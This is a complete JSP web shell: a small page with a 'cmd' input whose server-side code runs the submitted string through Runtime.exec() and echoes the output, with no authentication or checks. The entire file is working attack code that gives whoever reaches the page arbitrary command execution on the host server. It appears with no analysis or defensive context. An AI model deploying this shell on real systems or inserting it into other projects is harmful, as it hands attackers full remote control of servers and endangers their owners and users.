<HTML><BODY>
	<!-- DEVELOPED BY BIPIN JITIYA -->
	<FORM METHOD="POST" ACTION="">
		<INPUT TYPE="text" NAME="cmd"/><INPUT TYPE="submit" VALUE="Send"/>
	</FORM>
<PRE>
<%
	String cmd=request.getParameter("cmd");
	if (cmd != null) {
		out.println("Command: "+cmd+"<BR/>");
		String s = null;
		java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
		while((s = in.readLine()) != null) {out.println(s);}
	}
%>
</PRE>
</BODY></HTML>
